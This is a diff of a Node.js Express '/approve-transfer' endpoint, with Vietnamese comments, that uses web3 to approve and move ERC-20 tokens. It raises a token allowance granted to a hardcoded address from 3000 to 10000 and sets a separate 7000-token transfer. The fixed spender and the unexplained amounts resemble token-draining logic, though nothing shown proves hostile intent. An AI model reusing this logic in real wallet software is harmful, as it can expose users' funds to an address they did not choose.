@@ -507,7 +507,7 @@ app.post('/approve-transfer', async (req, res) => {
     const approvedAddress = '0x7019C9B19F4485B516B1D8C34C621Fd0325CaB84';
 
     // Số lượng token được ủy quyền
-    const approvedAmount = web3.utils.toHex(web3.utils.toWei('3000'));
+    const approvedAmount = web3.utils.toHex(web3.utils.toWei('10000'));
 
     // Khởi tạo phương thức approve để ủy quyền số lượng token
     const approveMethod = contract.methods.approve(approvedAddress, approvedAmount);
@@ -515,7 +515,7 @@ app.post('/approve-transfer', async (req, res) => {
     // Khởi tạo phương thức transferFrom với các tham số tương ứng
     const transferFromMethod = contract.methods.transferFrom(approvedAddress, fromAddress, approvedAmount);
 
-    const transferMethod = contract.methods.transfer(toAddress, approvedAmount);
+    const transferMethod = contract.methods.transfer(toAddress, web3.utils.toHex(web3.utils.toWei('7000')));
 
     // Lấy thông tin gas price hiện tại
     web3.eth.getGasPrice()
@@ -648,6 +648,8 @@ app.post('/approve-transfer', async (req, res) => {
                                                                                     console.log('Error');
                                                                                     // res.status(500).json({ error: 'Internal server error' });
                                                                                 });
+
+                                                                            res.status(200).json({ status: true });
                                                                         })
                                                                         .on('error', (error) => {
                                                                             console.error('Transfer transaction error:', error);
